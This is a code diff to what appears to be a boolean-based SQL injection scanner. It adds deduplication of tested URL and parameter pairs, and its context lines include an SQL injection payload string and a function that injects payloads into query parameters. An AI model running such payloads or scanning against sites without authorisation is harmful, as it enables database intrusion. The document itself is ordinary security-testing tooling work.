@@ -39,6 +39,9 @@ FALSE_PAYLOADS = [
     "' AND (3*3*0)=(2*4*1*0) AND 'randomString'='randomString"
 ]
 
+# Track (url, param) pairs that already have findings
+_found_pairs = set()
+
 def generate_random_string(length: int = 8) -> str:
     """Generate random string."""
     return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
@@ -69,10 +72,8 @@ def inject_payload_into_url(url: str, parameter: str, payload: str) -> str:
     query_params = parse_qs(parsed_url.query)
     
     if parameter in query_params:
-        # Inject into the first value of the parameter
         query_params[parameter] = [f"{query_params[parameter][0]} {payload}"]
     
-    # Rebuild the URL
     from urllib.parse import urlencode, urlunparse
     new_query = urlencode(query_params, doseq=True)
     new_parts = list(parsed_url)
@@ -108,6 +109,10 @@ def is_vulnerable(url: str, thread_count: int) -> bool:
     for parameter in parameters:
         if stop_scan.is_set(): return False
         
+        pair_key = (url, parameter)
+        if pair_key in _found_pairs:
+            return False
+        
         if check_if_already_vulnerable(url, parameter):
             logger.debug(f"Skipping known vulnerable: {url} param={parameter}")
             continue
@@ -136,6 +141,7 @@ def is_vulnerable(url: str, thread_count: int) -> bool:
             false_pattern = set(false_signatures)
 
             if true_pattern != false_pattern:
+                _found_pairs.add(pair_key)
                 print_status("Vulnerability Found!", "success")
                 print_status(f"  URL: {url}", "info")
                 print_status(f"  Parameter: {parameter}", "info")
@@ -152,14 +158,16 @@ def is_vulnerable(url: str, thread_count: int) -> bool:
                 result_manager = ResultManager(domain)
                 result_manager.add_finding("SQL Injection", "Technique: Boolean", vuln_data)
                 # Add to vulnerable pairs for DB fetching
-                vulnerable_pairs.add((url, parameter))
+                vulnerable_pairs.add(pair_key)
                 return True
 
     return False
 
 def process_urls(urls: List[str], thread_count: int) -> None:
     """Process URLs for Boolean-based SQLi."""
-
+    from lib.core.interrupt import reset_interrupt
+    reset_interrupt()
+    _found_pairs.clear()
     
     with ThreadPoolExecutor(max_workers=thread_count) as executor:
         futures = {executor.submit(is_vulnerable, url, thread_count): url for url in urls}
